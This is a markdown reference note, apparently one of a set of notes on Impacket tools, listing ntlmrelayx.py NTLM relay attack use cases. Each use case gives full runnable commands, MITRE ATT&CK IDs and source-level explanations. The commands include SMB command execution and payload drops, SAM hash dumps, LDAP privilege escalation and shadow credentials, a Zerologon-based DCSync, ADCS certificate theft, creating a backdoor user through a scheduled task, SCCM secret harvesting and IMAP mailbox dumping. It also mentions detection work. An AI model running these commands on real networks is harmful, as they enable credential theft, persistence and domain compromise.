# Impacket — ntlmrelayx.py — Hands-On Use Cases

Every command below assumes an NTLM authentication attempt is already inbound to `ntlmrelayx.py`'s listening server — via `Responder/` (LLMNR/NBT-NS/mDNS poisoning), a coercion primitive (PetitPotam/PrinterBug/ShadowCoerce), or organic cross-protocol auth, all covered in `01 - Overview.md`'s "How It Works." This file picks up from there: one target/attack-module combination per section, full runnable commands, MITRE ATT&CK ID(s) per use case. Where a use case's mechanics were verified live against `fortra/impacket` source and turned up something the tool's own docs/older write-ups get wrong, that correction is called out explicitly — most notably the DCSync section below, which is **not** what most cheat sheets describe.

## Contents
- [SMB Relay for Direct Command Execution](#smb-relay-for-direct-command-execution)
- [SMB Relay for File Drop via Service Install](#smb-relay-for-file-drop-via-service-install)
- [Default SMB Relay — Local SAM Hash Dump](#default-smb-relay--local-sam-hash-dump)
- [LDAP Relay — Default Domain-Privilege Escalation (ACL Attack vs. Group Attack)](#ldap-relay--default-domain-privilege-escalation-acl-attack-vs-group-attack)
- [LDAP Relay for Resource-Based Constrained Delegation](#ldap-relay-for-resource-based-constrained-delegation)
- [LDAP Relay for a Shadow Credentials Write](#ldap-relay-for-a-shadow-credentials-write)
- [Relaying Directly into DCSync — a Zerologon Exploit Chain, Not a Vanilla DRSUAPI Relay](#relaying-directly-into-dcsync--a-zerologon-exploit-chain-not-a-vanilla-drsuapi-relay)
- [ADCS Web Enrollment Relay (ESC8 over HTTP)](#adcs-web-enrollment-relay-esc8-over-http)
- [ADCS Certificate Enrollment over Raw RPC (ICPR)](#adcs-certificate-enrollment-over-raw-rpc-icpr)
- [SOCKS Mode — Keeping Relayed Sessions Alive for Other Tools](#socks-mode--keeping-relayed-sessions-alive-for-other-tools)
- [Multi-Target Relay via a Target File](#multi-target-relay-via-a-target-file)
- [MSSQL Relay for Query Execution](#mssql-relay-for-query-execution)
- [WinRM Relay for an Interactive PowerShell-Equivalent Session](#winrm-relay-for-an-interactive-powershell-equivalent-session)
- [RPC Relay for Task-Scheduler-Based Command Execution](#rpc-relay-for-task-scheduler-based-command-execution)
- [Chained After Responder — Poisoning Straight into Relay](#chained-after-responder--poisoning-straight-into-relay)
- [Chained After a Coercion Primitive](#chained-after-a-coercion-primitive)
- [Fleet-Wide Relay with a Target File and `--keep-relaying`](#fleet-wide-relay-with-a-target-file-and---keep-relaying)
- [SCCM Management Point — Secret Policy / Network Access Account Dump](#sccm-management-point--secret-policy--network-access-account-dump)
- [SCCM Distribution Point — Package File Dump](#sccm-distribution-point--package-file-dump)
- [IMAP Mailbox Harvesting via Relayed Authentication](#imap-mailbox-harvesting-via-relayed-authentication)

---

## SMB Relay for Direct Command Execution

**MITRE ATT&CK:** [T1557.001](https://attack.mitre.org/techniques/T1557/001/) (Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay) + [T1569.002](https://attack.mitre.org/techniques/T1569/002/) (System Services: Service Execution)

```bash
ntlmrelayx.py -t smb://10.10.10.20 -c "whoami /all"
```
Relays whichever authentication arrives to a single fixed SMB target and runs one command. Verified in `smbattack.py`: this executes via `RemoteOperations.__executeRemote()` and reads output back through a transient `ADMIN$\Temp\__output` file — **the exact same relay-file name and pattern** `wmiexec.py` uses for its own output channel (see `Impacket/wmiexec/03 - Source Evidence.md`), not a coincidence — both share the same underlying Impacket `RemoteOperations` plumbing.

## SMB Relay for File Drop via Service Install

**MITRE ATT&CK:** T1557.001 + T1569.002

```bash
ntlmrelayx.py -t smb://10.10.10.20 -e /tmp/beacon.exe
```
Pushes a local executable to the target and runs it as a service. Verified in `smbattack.py`: `-e` instantiates the same `serviceinstall.ServiceInstall` class `psexec.py` uses (`self.installService.install()` / `.uninstall()`) — expect the same random 4-character service name / random-cased binary-name pattern documented in `Impacket/psexec/01 - Overview.md`, not a distinct signature.

## Default SMB Relay — Local SAM Hash Dump

**MITRE ATT&CK:** T1557.001 + [T1003.002](https://attack.mitre.org/techniques/T1003/002/) (OS Credential Dumping: Security Account Manager)

```bash
ntlmrelayx.py -t smb://10.10.10.20 -l loot/ -of host20
```
No `-c`/`-e`/`-i` — the default SMB attack fires. **Correction to a common assumption (and to this note's own `01 - Overview.md` before this pass corrected it):** verified directly in `smbattack.py`, the default path calls `RemoteOperations.saveSAM()` → `SAMHashes` only. There is **no** `LSASecrets`/`saveSecurity()` call anywhere in this default branch — it dumps local SAM hashes exclusively, not the SAM+LSA-Secrets+cached-creds combination `secretsdump.py`'s own no-flag default produces. Output lands at `<lootdir>/<targethost>_samhashes.sam`. If LSA Secrets or cached domain creds are the goal, pivot to `secretsdump.py` directly against the same host once the relayed session's value is confirmed (or reach it through `-socks` mode, below).

## LDAP Relay — Default Domain-Privilege Escalation (ACL Attack vs. Group Attack)

**MITRE ATT&CK:** T1557.001 + [T1098](https://attack.mitre.org/techniques/T1098/) (Account Manipulation)

```bash
ntlmrelayx.py -t ldap://10.10.10.10
```
No attack-specific flags — this is the LDAP default, and it is **not** simply "create a Domain Admin," despite that being the common shorthand. Verified in `ldapattack.py`'s `run()` method:

1. Unless `--no-validate-privs` is set, the relayed identity's actual rights are enumerated first (`validatePrivileges()`) — logged as `Enumerating relayed user's privileges. This may take a while on large domains`.
2. **The ACL attack is preferred and tried first** (`--no-acl` to disable) — if the identity can write ACLs, it grants `DS-Replication-Get-Changes-All` directly on the domain object to an existing (`--escalate-user`) or newly created account, via a raw `nTSecurityDescriptor` modify. The tool's own log line makes the reasoning explicit: `Success! User %s now has Replication-Get-Changes-All privileges on the domain` followed by `Try using DCSync with secretsdump.py and this user :)` — the payoff is DCSync-capable rights on an account, **not** a literal "Domain Admins" membership.
3. **Only if that identity instead has group-add rights but not ACL-write rights** does the group attack fire (`--no-da` to disable) — this is the one that actually calls `addUserToGroup()` against a privileged group and is the closer match to the "adds a new Domain Admin" framing most write-ups use.

Both paths are default-enabled and can both fire in a single run depending on what the relayed identity can do. To target a specific existing account instead of creating a throwaway one:

```bash
ntlmrelayx.py -t ldap://10.10.10.10 --escalate-user svc-web
```

## LDAP Relay for Resource-Based Constrained Delegation

**MITRE ATT&CK:** T1557.001 + T1098 (Account Manipulation) → downstream ticket abuse via [T1558.003](https://attack.mitre.org/techniques/T1558/003/) (Steal or Forge Kerberos Tickets)

```bash
# Typical two-step: the relayed identity needs to control a principal with a known
# password to later request a service ticket "as" it, so add one first if needed
ntlmrelayx.py -t ldap://10.10.10.10 --add-computer ATTACKERPC 'P@ssw0rd123!'

# Grant RBCD on the relayed computer/target account to that new principal
ntlmrelayx.py -t ldap://10.10.10.10 --delegate-access
```
Writes `msDS-AllowedToActOnBehalfOfOtherIdentity` on the relayed identity's own computer object (verified in `ldapattack.py`'s `delegateAttack()` — the SD blob is built and sent via `ldap3.MODIFY_REPLACE`) to grant a controlled principal the right to impersonate arbitrary domain users to that computer via S4U2Self/S4U2Proxy. Requires the relayed identity have write access to its own `msDS-AllowedToActOnBehalfOfOtherIdentity` (the common case: the relayed account **is** a computer account with default self-write rights, or `--delegate-access` targets a computer the relayed identity already owns/administers) plus a principal with a known password to delegate from — `--add-computer` supplies that principal cheaply via the default `MachineAccountQuota`. `--sid` accepts a SID directly instead of resolving an account name.

## LDAP Relay for a Shadow Credentials Write

**MITRE ATT&CK:** T1557.001 + T1098 (Account Manipulation) — the resulting PKINIT authentication using the injected key is commonly associated with [T1556](https://attack.mitre.org/techniques/T1556/) (Modify Authentication Process), though MITRE has no dedicated sub-technique specifically for `msDS-KeyCredentialLink` abuse as of this writing

```bash
ntlmrelayx.py -t ldap://10.10.10.10 --shadow-credentials --shadow-target jsmith
```
Writes a new key-trust credential into the target account's `msDS-KeyCredentialLink` attribute (verified in `ldapattack.py`'s `shadowCredentialsAttack()`), generating a certificate/private-key pair the operator can use with PKINIT to obtain a TGT for `jsmith` without ever knowing their password. The tool prints the exact follow-on command needed (`gettgtpkinit.py -cert-pfx ... -pfx-pass ...`), which is itself useful as a hunt anchor — the log line `Updated the msDS-KeyCredentialLink attribute of the target object` is the definitive "this happened" marker. Requires `GenericWrite`/`WriteProperty` on the target's `msDS-KeyCredentialLink` — a common misconfiguration on computer objects the relayed identity has delegated-admin rights over.

## Relaying Directly into DCSync — a Zerologon Exploit Chain, Not a Vanilla DRSUAPI Relay

**MITRE ATT&CK:** T1557.001 + [T1212](https://attack.mitre.org/techniques/T1212/) (Exploitation for Credential Access, for the Zerologon step) + [T1003.006](https://attack.mitre.org/techniques/T1003/006/) (OS Credential Dumping: DCSync, for the resulting NTDS pull)

```bash
ntlmrelayx.py -t dcsync://dc01.corp.local
```

> 🔴 **This is the single most important correction verified in this build.** `-t dcsync://<dc>` reads like "relay a captured authentication straight into a DRSUAPI DCSync pull," and that is how most secondary write-ups describe it. It is not what the code does. Verified live in `impacket/examples/ntlmrelayx/clients/dcsyncclient.py`'s `DCSYNCRelayClient`: DRSUAPI mandates a signed-and-sealed RPC context (`RPC_C_AUTHN_LEVEL_PKT_PRIVACY`), and a pure relay operator has no way to derive that session key from a forwarded NTLM exchange alone. So the client does something else entirely — it runs the **Zerologon exploit (CVE-2020-1472)** against the target DC's own Netlogon RPC service: an unauthenticated `NetrServerReqChallenge` / `NetrServerAuthenticate3` loop using an all-zero 8-byte client credential, retried up to **6,000 times** (the vulnerability's ~1-in-256 success probability per attempt, from a zero-IV AES-CFB8 flaw), impersonating the DC's own computer account against itself. On success it derives a legitimate Netlogon session key and reuses it as the DRSUAPI signing/sealing key, **then** calls `secretsdump.py`'s own `NTDSHashes` class to actually pull data.

Practical consequences that follow directly from that mechanism:

- **The relayed victim's own AD privileges are irrelevant to success.** The real "authorization" bypassed here is Zerologon against Netlogon, not a `DS-Replication-Get-Changes-All` check — a completely unprivileged relayed user works exactly as well as a Domain Admin's.
- **Without extra credentials, this does not pull the full domain.** Verified in `sendAuth()`: if no separate SMB credentials are supplied via `-auth-smb`, the client dumps exactly three named objects — `krbtgt`, the DC's own machine account, and `Administrator` — not a full `-just-dc`-equivalent sweep. A full-domain pull requires:

```bash
ntlmrelayx.py -t dcsync://dc01.corp.local -auth-smb CORP/administrator:'P@ssw0rd!'
```

- **This only works against a DC that is unpatched for CVE-2020-1472, or patched but not yet enforcing.** Microsoft's Netlogon secure-channel enforcement has been the default for updated systems since the February 2021 enforcement phase; against a compliant, current DC this exhausts all 6,000 attempts and logs `No success bypassing auth after 6,000 attempts. Target likely patched!` — treat `-t dcsync://` as a "check if this specific DC was ever patched" probe, not a reliable DCSync-via-relay technique on a well-maintained estate.
- **This is far louder than a legitimate DCSync.** Up to 6,000 rapid Netlogon secure-channel-setup RPC calls against a single DC is an extreme volumetric anomaly with no equivalent in `secretsdump.py -just-dc` or Mimikatz's `lsadump::dcsync` — see `04 - Target Evidence.md` and `05 - Detection and Hunting.md` for the resulting signature.

For a legitimate-rights-based DCSync that doesn't depend on an unpatched DC, use the LDAP ACL-attack path above to grant replication rights, then run `secretsdump.py -just-dc` with the resulting account — see `Impacket/secretsdump/02 - Hands-On Use Cases.md`.

## ADCS Web Enrollment Relay (ESC8 over HTTP)

**MITRE ATT&CK:** T1557.001 + [T1649](https://attack.mitre.org/techniques/T1649/) (Steal or Forge Authentication Certificates)

```bash
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs
```
Verified in `httpattacks/adcsattack.py`: generates a 4096-bit RSA keypair and a CSR, submits it via `POST /certsrv/certfnsh.asp` (template defaults to `Machine` if the relayed account name ends in `$`, otherwise `User` — override with `--template`), then retrieves the issued certificate via `GET /certsrv/certnew.cer?ReqID=<id>` and writes it out as `<lootdir>/<username>.pfx`. The resulting certificate authenticates as the relayed identity via PKINIT/Schannel indefinitely (until revoked or expired) — a durable persistence artifact, not just a one-time access grant. `--altname` (SAN abuse for ESC1/ESC6-style targeting) and `--enum-templates` (read-only enumeration of enrollable templates, via `GET /certsrv/certrqxt.asp`, before requesting anything) are both real, separately verified endpoints in the same module.

## ADCS Certificate Enrollment over Raw RPC (ICPR)

**MITRE ATT&CK:** T1557.001 + T1649

```bash
ntlmrelayx.py -t rpc://ca-server.corp.local -rpc-mode ICPR -icpr-ca-name corp-CA01-CA
```
Same certificate-issuance goal as the HTTP path above, reached over the **MS-ICPR** RPC interface instead of the web-enrollment HTTP endpoint — verified in `rpcattack.py`'s `ICPRRPCAttack`, which calls `icpr.hCertServerRequest()` directly and writes the resulting certificate to the same `.pfx` loot-file pattern. Relevant when the CA's HTTP web-enrollment role isn't installed but the CA service (which always exposes MS-ICPR) is reachable — a straight RPC-transport alternative to ESC8, not a different vulnerability class.

## SOCKS Mode — Keeping Relayed Sessions Alive for Other Tools

**MITRE ATT&CK:** T1557.001 + [T1090](https://attack.mitre.org/techniques/T1090/) (Proxy)

```bash
ntlmrelayx.py -t smb://10.10.10.20 -t ldap://10.10.10.10 -socks -socks-port 1080
```
Instead of firing one fixed attack module automatically, every successfully relayed session is kept alive behind a local SOCKS5 proxy (default `127.0.0.1:1080`) plus an HTTP control API (`-http-api-port`, default `9090`) an operator can query for live sessions. Point any other tool through it:

```bash
proxychains secretsdump.py -no-pass -k CORP/jsmith@10.10.10.20   # or any SOCKS-aware invocation
```
The value: a relayed session's worth isn't always known at capture time — SOCKS mode defers the "what do I do with this" decision, and lets multiple relayed identities stay usable simultaneously instead of one attack firing once per session.

## Multi-Target Relay via a Target File

**MITRE ATT&CK:** T1557.001

```bash
cat > targets.txt <<EOF
smb://10.10.10.20
smb://10.10.10.21
ldap://10.10.10.10
EOF

ntlmrelayx.py -tf targets.txt -ra -w
```
`-tf` rotates relay targets from a file instead of a single `-t`; `-ra` randomizes selection instead of sequential rotation (spreads relay attempts thinner across a fleet, both operationally and for evasion); `-w` watches the file for edits and reloads it live, letting an operator add/remove targets mid-engagement without restarting the listener.

## MSSQL Relay for Query Execution

**MITRE ATT&CK:** T1557.001 — MITRE has no dedicated sub-technique for MSSQL-specific lateral movement (unlike SMB/WinRM/SSH, which each have one under [T1021](https://attack.mitre.org/techniques/T1021/)); if the operator's query subsequently invokes `xp_cmdshell`, the resulting OS command execution is better tagged [T1059.003](https://attack.mitre.org/techniques/T1059/003/) (Windows Command Shell)

```bash
ntlmrelayx.py -t mssql://10.10.10.30 -q "SELECT name FROM sys.databases" -q "EXEC xp_cmdshell 'whoami'"
```
`-q` is repeatable and executes arbitrary T-SQL against the relayed session — verified in `mssqlattack.py`: the module itself does **not** call `sp_configure` to enable `xp_cmdshell` automatically, so if `xp_cmdshell` is disabled on the target (the modern SQL Server default), the operator's query must enable it explicitly first (`EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`) or fall back to `-i` for an interactive SQL shell instead.

## WinRM Relay for an Interactive PowerShell-Equivalent Session

**MITRE ATT&CK:** T1557.001 + [T1021.006](https://attack.mitre.org/techniques/T1021/006/) (Remote Services: Windows Remote Management)

```bash
ntlmrelayx.py -t winrm://10.10.10.40
```
WinRM relay always drops into an interactive shell (`WinRMAttack` verified constructing WS-Man SOAP `Create`/`Command`/`Receive`/`Delete` operations against `/wsman` directly, backed by a local `TcpShell` an operator connects to). There is no separate one-shot `-c`-style command-execution path for this protocol the way SMB/RPC have — every WinRM relay is effectively `-i`.

## RPC Relay for Task-Scheduler-Based Command Execution

**MITRE ATT&CK:** T1557.001 + [T1053.005](https://attack.mitre.org/techniques/T1053/005/) (Scheduled Task/Job: Scheduled Task)

```bash
ntlmrelayx.py -t rpc://10.10.10.20 -rpc-mode TSCH -c "net user backdoor P@ssw0rd123! /add"
```
Default RPC-relay mode. Verified in `rpcattack.py`'s `TSCHRPCAttack`: registers a randomly-named task via `ITaskSchedulerService`'s `SchRpcRegisterTask`, runs it via `SchRpcRun`, polls `SchRpcGetLastRunInfo` until it completes, then deletes it via `SchRpcDelete` — the exact same register→run→poll→delete cycle `atexec.py` uses on its own, standalone Task Scheduler connection. This is the SMB-to-SMB relay's alternative execution path (`--rpc-attack TSCH` from the SMB side reaches the same code) when a plain service-based exec (`-c` on a straight `smb://` target) is undesirable.

## Chained After Responder — Poisoning Straight into Relay

**MITRE ATT&CK:** T1557.001 (this ID's own name is literally "LLMNR/NBT-NS Poisoning and SMB Relay")

```bash
# 1. Responder.conf: disable its own SMB/HTTP servers so ntlmrelayx can bind those ports
#    (SMB = On/HTTP = On in Responder.conf must both be flipped to Off first)

# 2. Start the relay listener against a signing-disabled target list
ntlmrelayx.py -tf targets.txt -smb2support

# 3. In a second terminal, start Responder to capture and hand off broadcast auth
responder -I eth0 -wrf
```
Full mechanics of the Responder-side handoff — the exact `Responder.conf` edits and why SMB/HTTP have to be turned off there specifically — are documented in `Responder/02 - Hands-On Use Cases.md`'s "Relaying Captured Auth Instead of Cracking It." This is the canonical broadcast-poisoning-to-relay chain: Responder answers a stale/mistyped name lookup, the victim authenticates to what it thinks is the real resource, and `ntlmrelayx.py` is the listener that actually catches and forwards that authentication.

## Chained After a Coercion Primitive

**MITRE ATT&CK:** [T1187](https://attack.mitre.org/techniques/T1187/) (Forced Authentication) + T1557.001

```bash
# 1. Relay listener up first, targeting an LDAP(S) endpoint for an RBCD grant on the
#    coerced machine account
ntlmrelayx.py -t ldaps://10.10.10.10 --delegate-access --escalate-user pwned-computer$

# 2. Force the target DC (or any machine account) to authenticate to the relay host
python3 PetitPotam.py <relay-host-ip> dc01.corp.local
```
Unlike Responder's passive wait-for-a-mistake model, a coercion primitive (PetitPotam/MS-EFSRPC, PrinterBug/MS-RPRN, ShadowCoerce/MS-FSRVP) actively forces a **specific, chosen** machine account — often a Domain Controller itself — to authenticate to the relay host on demand. Coerced DC-machine-account authentication relayed into an LDAP RBCD grant on that same DC's own computer object is one of the highest-value chains in this technique family, since it can lead directly to a DC-impersonating S4U2Proxy ticket. Coercion-primitive mechanics themselves are out of scope for this note (they are not Impacket `ntlmrelayx.py` code) — see MITRE's T1187 page for the technique class.

## Fleet-Wide Relay with a Target File and `--keep-relaying`

**MITRE ATT&CK:** T1557.001, at scale

```bash
ntlmrelayx.py -tf targets.txt --keep-relaying -c "whoami" -l loot/ -dh
```
`--keep-relaying` changes the default one-relay-per-target-then-done behavior to keep relaying to a target even after a successful hit — useful when a single captured authentication (e.g. a machine account that broadcasts repeatedly, or a DC forced to re-authenticate on a schedule) should be exploited against every host in `targets.txt`, not just the first one it succeeds against. Combined with `-dh` (print hashes to console as captured) and `-l`/loot output, this is the shape used when one high-value coerced/poisoned authentication needs to be sprayed across an entire target list rather than spent on one host.

## SCCM Management Point — Secret Policy / Network Access Account Dump

**MITRE ATT&CK:** T1557.001 + [T1552](https://attack.mitre.org/techniques/T1552/) (Unsecured Credentials) — MITRE has no sub-technique specific to SCCM policy-secret harvesting; T1552 is the closest general fit

```bash
ntlmrelayx.py -t http://sccm-mp01.corp.local --sccm-policies
```
Verified in `httpattacks/sccmpoliciesattack.py`: registers a fake SCCM client device with a self-signed certificate against `POST /ccm_system_windowsauth/request`, sleeps (`--sccm-policies-sleep`, default 180s) to allow automatic device approval to take effect, requests the assigned policy set via `POST /ccm_system/request`, then decrypts every policy flagged `SECRET` in its `PolicyFlags`. The single highest-value output is the **Network Access Account (NAA)** credential pair, printed as `Retrieved NAA account credentials: '<user>:<pass>'` — a domain credential SCCM clients use to reach content on Distribution Points, frequently over-privileged in real deployments. Best relayed with a **machine account** authentication (works "best" per the tool's own comment), since automatic device approval is commonly gated on that. All loot lands in `<target>_<timestamp>_sccm_policies_loot/`, including the fake device's own generated cert/key (reusable later with the standalone `SCCMSecrets.py` tool this module is based on).

## SCCM Distribution Point — Package File Dump

**MITRE ATT&CK:** T1557.001 + T1552

```bash
ntlmrelayx.py -t http://sccm-dp01.corp.local --sccm-dp --sccm-dp-extensions ".ps1,.bat,.xml,.txt,.pfx,.ini"
```
Verified in `httpattacks/sccmdpattack.py`: crawls the Distribution Point's `GET /sms_dp_smspkg$/Datalib` directory index to enumerate package IDs, then recursively walks each package's own directory tree (`/sms_dp_smspkg$/<packageID>/...`, capped at depth 7) using a `User-Agent: SMS CCM 5.0 TS` header that matches genuine SCCM client traffic, downloading every file matching the configured extension list (default `.ps1,.bat,.xml,.txt,.pfx`). Deployment scripts frequently embed plaintext credentials or reusable `.pfx` certificates — this is a file-harvesting technique, distinct from `--sccm-policies`' live-policy-decryption approach, and the two are commonly run back-to-back against a single SCCM site's MP and DP roles.

## IMAP Mailbox Harvesting via Relayed Authentication

**MITRE ATT&CK:** T1557.001 + [T1114.002](https://attack.mitre.org/techniques/T1114/002/) (Email Collection: Remote Email Collection)

```bash
# Keyword-targeted search across subject and body
ntlmrelayx.py -t imaps://mail.corp.local -k password

# Full mailbox dump, capped at 200 messages
ntlmrelayx.py -t imaps://mail.corp.local -a -im 200
```
Verified in `imapattack.py`: `-k`/`--keyword` issues an IMAP `SEARCH` against both `SUBJECT` and `BODY` (default keyword `password`, logged as `Dumping %d messages found by search for "%s"`); `-a`/`--all` bypasses the search and walks the whole mailbox (default `INBOX`, override with `-m`); `-im`/`--imap-max` truncates the result set. Every matched message is fetched whole (`FETCH ... RFC822`) and saved as an individual `.eml` file, named `mail_<user>-<mailbox>_<index>.eml`, in the loot directory — realistic goal: password-reset emails, other systems' plaintext credentials sent by mail, or sensitive attachments, reached entirely through a single relayed webmail/IMAP authentication.
